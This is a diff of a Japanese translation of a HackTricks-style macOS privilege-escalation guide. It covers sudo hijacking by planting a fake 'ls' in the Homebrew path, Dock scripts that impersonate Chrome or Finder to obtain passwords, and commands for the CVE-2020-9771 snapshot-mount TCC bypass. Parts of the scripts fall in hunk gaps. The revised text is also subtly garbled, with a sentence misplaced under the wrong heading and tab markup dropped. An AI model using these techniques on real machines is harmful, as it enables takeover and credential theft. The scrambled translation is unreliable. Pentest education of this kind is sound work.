@@ -1,22 +1,22 @@
-# macOS 権限昇格
+# macOS特権昇格
 
 <details>
 
-<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</summary>
 
-HackTricksをサポートする他の方法:
+HackTricksをサポートする他の方法：
 
-* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
-* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。
+- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+- [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)で**フォロー**する。
+- **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
 
 </details>
 
-## TCC 権限昇格
+## TCC特権昇格
 
-TCC権限昇格を探している場合は、以下をご覧ください:
+TCC特権昇格を探している場合は、以下に移動してください：
 
 {% content-ref url="macos-security-protections/macos-tcc/" %}
 [macos-tcc](macos-security-protections/macos-tcc/)
@@ -24,7 +24,7 @@ TCC権限昇格を探している場合は、以下をご覧ください:
 
 ## Linux Privesc
 
-**Linux/Unixに影響を与える権限昇格に関するほとんどのトリックは、MacOSマシンにも影響を与える**ことに注意してください。したがって、以下を参照してください:
+Linux/Unixに影響を与える特権昇格に関するほとんどのトリックは、MacOSマシンにも影響を与えることに注意してください。したがって、以下を参照してください：
 
 {% content-ref url="../../linux-hardening/privilege-escalation/" %}
 [privilege-escalation](../../linux-hardening/privilege-escalation/)
@@ -32,11 +32,11 @@ TCC権限昇格を探している場合は、以下をご覧ください:
 
 ## ユーザーインタラクション
 
-### Sudo Hijacking
+### Sudoハイジャッキング
 
-元の[Sudo HijackingテクニックはLinux権限昇格の投稿の中にあります](../../linux-hardening/privilege-escalation/#sudo-hijacking)。
+オリジナルの[SudoハイジャッキングテクニックはLinux特権昇格ポスト内](../../linux-hardening/privilege-escalation/#sudo-hijacking)にあります。
 
-しかし、macOSはユーザーが**`sudo`**を実行するときに**`PATH`**を**維持**します。つまり、この攻撃を達成する別の方法は、被害者が**sudoを実行するときに実行する他のバイナリをハイジャックする**ことです。
+ただし、macOSは**`sudo`**を実行するときにユーザーの**`PATH`**を**維持**します。つまり、この攻撃を達成する別の方法は、被害者が**`sudo`**を実行するときに実行する他のバイナリを**ハイジャック**することです。
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
@@ -51,17 +51,15 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-ターミナルを使用するユーザーは、高い確率で**Homebrewがインストールされている**ことに注意してください。したがって、**`/opt/homebrew/bin`**内のバイナリをハイジャックすることが可能です。
+### ドックの偽装
 
-### Dock のなりすまし
-
-**ソーシャルエンジニアリング**を使用して、たとえばドック内の Google Chrome を**なりすまし**、実際には自分のスクリプトを実行することができます：
+ターミナルを使用するユーザーはほとんどが**Homebrewをインストールしている可能性**が高いことに注意してください。そのため、**`/opt/homebrew/bin`**内のバイナリを乗っ取ることが可能です。
 
 {% tabs %}
-{% tab title="Chrome のなりすまし" %}
-いくつかの提案：
+{% tab title="Chromeの偽装" %}
+いくつかの提案:
 
-* Dock で Chrome があるかを確認し、その場合はそのエントリを**削除**し、Dock 配列の同じ位置に**偽の** **Chrome エントリを追加**します。
+* ドックでChromeがあるかどうかをチェックし、その場合はそのエントリを**削除**して、ドック配列の**同じ位置に偽のChromeエントリを追加**します。
 ```bash
 #!/bin/sh
 
@@ -133,14 +131,14 @@ killall Dock
 ```
 {% endtab %}
 
-{% tab title="Finderのなりすまし" %}
-いくつかの提案:
+{% tab title="Finder Impersonation" %}
+いくつかの提案：
 
-* **DockからFinderを削除することはできません**ので、Dockに追加する場合は、偽のFinderを本物の隣に置くことができます。これには、**Dock配列の始めに偽のFinderエントリを追加する必要があります**。
-* 別の選択肢として、Dockに置かずに開くだけでも、「FinderがFinderの制御を求めている」はそれほど奇妙ではありません。
-* パスワードを聞かずにrootに**昇格する**別の方法は、Finderに実際にパスワードを求めて特権アクションを実行させることです:
-* Finderに**`/etc/pam.d`** に新しい **`sudo`** ファイルをコピーさせる（パスワードを求めるプロンプトは「Finderがsudoのコピーを望んでいる」と表示されます）
-* Finderに新しい**Authorization Plugin**をコピーさせる（ファイル名を制御できるので、パスワードを求めるプロンプトは「FinderがFinder.bundleのコピーを望んでいる」と表示されます）
+- **DockからFinderを削除することはできません**ので、Dockに追加する場合は、偽のFinderを本物のFinderのすぐ隣に配置することができます。そのためには、**Dock配列の先頭に偽のFinderエントリを追加する必要があります**。
+- 別のオプションは、Dockに配置せずに開くだけで、"FinderがFinderを制御するように要求しています"というのはそれほど奇妙ではありません。
+- ルートに**パスワードを尋ねずに昇格する**別のオプションは、Finderに特権操作を実行するためのパスワードを本当に求めるようにすることです：
+  - Finderに新しい**`sudo`**ファイルを**`/etc/pam.d`**にコピーするように要求します（パスワードを求めるプロンプトには"Finder wants to copy sudo"と表示されます）
+  - 新しい**認証プラグイン**をコピーするようにFinderに要求します（ファイル名を制御できるため、パスワードを求めるプロンプトには"Finder wants to copy Finder.bundle"と表示されます）
 ```bash
 #!/bin/sh
 
@@ -210,15 +208,12 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 sleep 0.1
 killall Dock
 ```
-{% endtab %}
-{% endtabs %}
-
 ## TCC - ルート権限昇格
 
-### CVE-2020-9771 - mount\_apfs TCCバイパスと権限昇格
+### CVE-2020-9771 - mount_apfs TCC バイパスと権限昇格
 
-**任意のユーザー**（権限のないユーザーも含む）は、タイムマシンのスナップショットを作成し、マウントして、そのスナップショットの**すべてのファイルにアクセス**することができます。
-**唯一必要な権限**は、使用されるアプリケーション（例えば`Terminal`）が**フルディスクアクセス**（FDA）権限（`kTCCServiceSystemPolicyAllfiles`）を持っていることで、これは管理者によって付与される必要があります。
+**どんなユーザー**（特権を持たないユーザーでも）がタイムマシンのスナップショットを作成し、マウントし、そのスナップショットの**すべてのファイルにアクセス**できます。\
+**唯一の特権**は、使用されるアプリケーション（例：`Terminal`）が**Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）を持つ必要があり、これは管理者によって許可される必要があります。
 
 {% code overflow="wrap" %}
 ```bash
@@ -240,14 +235,13 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-```markdown
 {% endcode %}
 
-より詳細な説明は[**元のレポートで見ることができます**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**
+より詳しい説明は[**元のレポート**](https://theevilbit.github.io/posts/cve\_2020\_9771/)にあります**。**
 
 ## 機密情報
 
-これは権限昇格に役立つ可能性があります：
+特権を昇格させるのに役立つ可能性があります:
 
 {% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
 [macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
@@ -255,15 +249,14 @@ ls /tmp/snap/Users/admin_user # This will work
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローに学ぶ</strong></a><strong>！</strong></summary>
+<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-HackTricksをサポートする他の方法：
+HackTricksをサポートする他の方法:
 
-* **HackTricksにあなたの**会社を広告したい**、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローしてください。**
-* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください。**
+* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする**.**
+* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。
 
 </details>
-```
